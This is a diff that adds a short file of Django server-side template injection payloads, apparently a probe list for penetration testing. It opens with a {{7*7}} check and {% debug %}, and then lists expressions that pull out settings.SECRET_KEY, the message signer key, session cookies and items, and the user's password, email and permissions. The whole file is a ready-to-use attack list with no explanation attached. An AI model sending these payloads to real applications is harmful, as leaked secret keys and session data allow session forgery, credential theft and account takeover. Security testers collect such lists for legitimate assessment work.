@@ -1,0 +1,15 @@
+{{7*7}}
+{% debug %}
+{{settings.SECRET_KEY}}
+{{request.META.HTTP_USER_AGENT}}
+{{request.user.username}}
+{{request.user.password}}
+{{request.session.items}}
+{{request.COOKIES.sessionid}}
+{{request.GET.q}}
+{{request.POST.username}}
+{{messages.storages.0.signer.key}}
+{% include 'admin/base.html' %}
+{{request.user.get_all_permissions}}
+{{request.user.is_superuser}}
+{{request.user.email}}
